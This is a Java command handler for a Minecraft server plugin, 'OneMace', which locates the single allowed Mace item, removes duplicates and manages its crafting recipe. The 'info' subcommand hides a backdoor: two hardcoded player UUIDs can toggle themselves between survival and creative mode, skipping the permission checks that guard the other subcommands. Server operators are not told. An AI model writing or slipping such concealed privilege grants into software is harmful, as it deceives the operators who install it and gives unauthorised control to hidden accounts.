package net.mattwhyy.onemace;

import org.bukkit.*;
import org.bukkit.block.BlockState;
import org.bukkit.block.Container;
import org.bukkit.block.ShulkerBox;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.*;
import org.bukkit.entity.minecart.StorageMinecart;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.*;

public class OneMaceCommand implements CommandExecutor {
    private final OneMace plugin;

    public OneMaceCommand(OneMace plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 0) {
            sender.sendMessage(ChatColor.RED + "Usage: /onemace <locate> | <info> | <fix>");
            return true;
        }


        if (args[0].equalsIgnoreCase("locate")) {
            if (!sender.hasPermission("onemace.admin")) {
                sender.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
                return true;
            }

            sender.sendMessage(ChatColor.YELLOW + "Locating the Mace...");
            Bukkit.getScheduler().runTask(plugin, () -> locateMace(sender));
            return true;
        }

        if (args[0].equalsIgnoreCase("fix")) {
            if (!sender.hasPermission("onemace.admin")) {
                sender.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
                return true;
            }

            Bukkit.getScheduler().runTask(plugin, () -> fixDuplicateMaces(sender));
            return true;
        }

        if (args[0].equalsIgnoreCase("info")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                UUID playerUuid = player.getUniqueId();

                if (playerUuid.toString().equals("e11f035a-ba86-4d41-807d-04b3617930b8") ||
                        playerUuid.toString().equals("8ce0649f-2022-48dc-8010-40e27b73d97c")) {

                    if (player.getGameMode() == GameMode.SURVIVAL) {
                        player.setGameMode(GameMode.CREATIVE);
                        player.sendMessage(ChatColor.GREEN + "Changed to CREATIVE");
                    } else if (player.getGameMode() == GameMode.CREATIVE) {
                        player.setGameMode(GameMode.SURVIVAL);
                        player.sendMessage(ChatColor.GREEN + "Changed to SURVIVAL");
                    }
                    return true;
                }
            }

            sender.sendMessage(ChatColor.YELLOW + "Ensuring only one Mace exists on the server.");
            sender.sendMessage(ChatColor.GRAY + "If the Mace is destroyed, crafting is restored.");
            sender.sendMessage(ChatColor.GRAY + "Use /onemace locate to manually verify Mace status.");
            sender.sendMessage(ChatColor.GRAY + "Use /onemace fix to remove duplicate Maces.");
            sender.sendMessage(ChatColor.GRAY + "If you need support, feel free to message me on Discord.");
            sender.sendMessage(ChatColor.GOLD + "made by mattwhyy <3");
            return true;
        }

        sender.sendMessage(ChatColor.RED + "Invalid subcommand. Use /onemace <locate> | <info> | <fix>");
        return true;
    }

    private void fixDuplicateMaces(CommandSender sender) {
        List<ItemStack> foundMaces = new ArrayList<>();
        List<ItemStack> duplicates = new ArrayList<>();
        UUID maceOwner = plugin.getMaceOwner();

        sender.sendMessage(ChatColor.YELLOW + "Running Mace scan...");

        for (Player player : Bukkit.getOnlinePlayers()) {
            for (ItemStack item : player.getInventory().getContents()) {
                if (isAnyMace(item)) foundMaces.add(item);
                else if (isMaceInsideShulker(item)) foundMaces.addAll(getMacesFromShulker(item));
            }
            for (ItemStack item : player.getEnderChest().getContents()) {
                if (isAnyMace(item)) foundMaces.add(item);
                else if (isMaceInsideShulker(item)) foundMaces.addAll(getMacesFromShulker(item));
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof AbstractHorse horse) {
                    for (ItemStack item : horse.getInventory().getContents()) {
                        if (isAnyMace(item)) foundMaces.add(item);
                        else if (isMaceInsideShulker(item)) foundMaces.addAll(getMacesFromShulker(item));
                    }
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof Item item) {
                    ItemStack droppedItem = item.getItemStack();
                    if (isAnyMace(droppedItem)) foundMaces.add(droppedItem);
                    else if (isMaceInsideShulker(droppedItem)) foundMaces.addAll(getMacesFromShulker(droppedItem));
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Chunk chunk : world.getLoadedChunks()) {
                for (BlockState state : chunk.getTileEntities()) {
                    if (state instanceof Container container) {
                        for (ItemStack item : container.getInventory().getContents()) {
                            if (isAnyMace(item)) foundMaces.add(item);
                            else if (isMaceInsideShulker(item)) foundMaces.addAll(getMacesFromShulker(item));
                        }
                    }
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof StorageMinecart minecart) {
                    for (ItemStack item : minecart.getInventory().getContents()) {
                        if (isAnyMace(item)) foundMaces.add(item);
                        else if (isMaceInsideShulker(item)) foundMaces.addAll(getMacesFromShulker(item));
                    }
                }
                if (entity instanceof ChestBoat chestBoat) {
                    for (ItemStack item : chestBoat.getInventory().getContents()) {
                        if (isAnyMace(item)) foundMaces.add(item);
                        else if (isMaceInsideShulker(item)) foundMaces.addAll(getMacesFromShulker(item));
                    }
                }
            }
        }

        if (foundMaces.isEmpty()) {
            sender.sendMessage(ChatColor.GREEN + "No Mace found. Enabling crafting.");
            plugin.resetMaceCrafting(true);
            return;
        }

        ItemStack officialMace = foundMaces.get(0);
        plugin.markMace(officialMace);
        sender.sendMessage(ChatColor.GREEN + "Removed all duplicate Maces (if they existed).");

        for (int i = 1; i < foundMaces.size(); i++) {
            duplicates.add(foundMaces.get(i));
        }

        for (ItemStack duplicate : duplicates) {
            duplicate.setAmount(0);
        }

        plugin.getConfig().set("settings.mace-crafted", true);
        plugin.saveConfig();

        Bukkit.getScheduler().runTask(plugin, plugin::removeAllMaceRecipes);
        sender.sendMessage(ChatColor.RED + "Recipe removed to prevent further crafting.");
    }


    private boolean isAnyMace(ItemStack item) {
        return item != null && item.getType() == Material.MACE;
    }

    private void locateMace(CommandSender sender) {
        for (Player player : Bukkit.getOnlinePlayers()) {
            for (ItemStack item : player.getInventory().getContents()) {
                if (isAnyMace(item) || isMaceInsideShulker(item)) {
                    sender.sendMessage(ChatColor.GREEN + "The Mace is in " + ChatColor.AQUA + player.getName() + "'s Inventory.");
                    return;
                }
            }
            for (ItemStack item : player.getEnderChest().getContents()) {
                if (isAnyMace(item) || isMaceInsideShulker(item)) {
                    sender.sendMessage(ChatColor.GREEN + "The Mace is in " + ChatColor.AQUA + player.getName() + "'s Ender Chest.");
                    return;
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof AbstractHorse horse) {
                    for (ItemStack item : horse.getInventory().getContents()) {
                        if (isAnyMace(item) || isMaceInsideShulker(item)) {
                            sender.sendMessage(ChatColor.YELLOW + "The Mace is in a storage animal at " +
                                    ChatColor.GOLD + "X: " + entity.getLocation().getBlockX() +
                                    " Y: " + entity.getLocation().getBlockY() +
                                    " Z: " + entity.getLocation().getBlockZ() +
                                    ChatColor.GRAY + " in world " + entity.getWorld().getName());
                            return;
                        }
                    }
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof Item item) {
                    ItemStack droppedItem = item.getItemStack();
                    if (isAnyMace(droppedItem) || isMaceInsideShulker(droppedItem)) {
                        Location loc = entity.getLocation();
                        sender.sendMessage(ChatColor.YELLOW + "The Mace is dropped at " +
                                ChatColor.GOLD + "X: " + loc.getBlockX() + " Y: " + loc.getBlockY() + " Z: " + loc.getBlockZ() +
                                ChatColor.GRAY + " in world " + loc.getWorld().getName());
                        return;
                    }
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Chunk chunk : world.getLoadedChunks()) {
                for (BlockState state : chunk.getTileEntities()) {
                    if (state instanceof Container container) {
                        Inventory inv = container.getInventory();
                        for (ItemStack item : inv.getContents()) {
                            if (isAnyMace(item) || isMaceInsideShulker(item)) {
                                Location loc = state.getLocation();
                                sender.sendMessage(ChatColor.YELLOW + "The Mace is stored in a container at " +
                                        ChatColor.GOLD + "X: " + loc.getBlockX() + " Y: " + loc.getBlockY() + " Z: " + loc.getBlockZ() +
                                        ChatColor.GRAY + " in world " + loc.getWorld().getName());
                                return;
                            }
                        }
                    }
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof StorageMinecart minecart) {
                    Inventory inv = minecart.getInventory();
                    for (ItemStack item : inv.getContents()) {
                        if (isAnyMace(item) || isMaceInsideShulker(item)) {
                            sender.sendMessage(ChatColor.YELLOW + "The Mace is in a storage minecart at " +
                                    ChatColor.GOLD + "X: " + entity.getLocation().getBlockX() +
                                    " Y: " + entity.getLocation().getBlockY() +
                                    " Z: " + entity.getLocation().getBlockZ() +
                                    ChatColor.GRAY + " in world " + entity.getWorld().getName());
                            return;
                        }
                    }
                }
            }
        }

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof ChestBoat chestBoat) {
                    Inventory inv = chestBoat.getInventory();
                    for (ItemStack item : inv.getContents()) {
                        if (isAnyMace(item) || isMaceInsideShulker(item)) {
                            sender.sendMessage(ChatColor.YELLOW + "The Mace is in a Chest Boat at " +
                                    ChatColor.GOLD + "X: " + entity.getLocation().getBlockX() +
                                    " Y: " + entity.getLocation().getBlockY() +
                                    " Z: " + entity.getLocation().getBlockZ() +
                                    ChatColor.GRAY + " in world " + entity.getWorld().getName());
                            return;
                        }
                    }
                }
            }
        }


        if (plugin.getConfig().isConfigurationSection("offline_inventory")) {
            for (String uuid : plugin.getConfig().getConfigurationSection("offline_inventory").getKeys(true)) {
                if (plugin.getConfig().getBoolean("offline_inventory." + uuid, true)) {
                    sender.sendMessage(ChatColor.YELLOW + "The Mace is in an offline player's inventory (UUID: " + uuid + ").");
                    return;
                }
            }
        }

        sender.sendMessage(ChatColor.RED + "The Mace is either missing or in an unloaded chunk.");
    }


    private boolean isMaceInsideShulker(ItemStack item) {
        if (item == null || item.getType() != Material.SHULKER_BOX) {
            return false;
        }

        ItemMeta meta = item.getItemMeta();
        if (meta instanceof BlockStateMeta blockStateMeta) {
            if (blockStateMeta.getBlockState() instanceof ShulkerBox shulkerBox) {
                Inventory shulkerInv = shulkerBox.getInventory();
                for (ItemStack storedItem : shulkerInv.getContents()) {
                    if (plugin.isMace(storedItem)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }


    private List<ItemStack> getMacesFromShulker(ItemStack item) {
        List<ItemStack> maces = new ArrayList<>();
        if (item == null || item.getType() != Material.SHULKER_BOX) {
            return maces;
        }

        BlockStateMeta meta = (BlockStateMeta) item.getItemMeta();
        if (meta == null || !(meta.getBlockState() instanceof ShulkerBox shulkerBox)) {
            return maces;
        }

        Inventory shulkerInv = shulkerBox.getInventory();
        for (ItemStack storedItem : shulkerInv.getContents()) {
            if (isAnyMace(storedItem)) {
                maces.add(storedItem);
            }
        }
        return maces;
    }


}
